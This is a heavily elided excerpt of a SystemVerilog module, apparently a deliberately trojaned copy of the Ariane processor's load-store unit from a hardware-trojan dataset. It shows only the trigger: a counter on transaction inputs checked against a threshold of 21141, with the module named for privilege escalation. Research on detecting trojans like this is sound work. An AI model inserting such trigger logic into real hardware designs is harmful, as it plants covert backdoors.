...
module load_store_unit_trojan_Privilege
  import ariane_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=21141)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 21141;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|tinst_i) trojan_counter <= trojan_counter + 1;
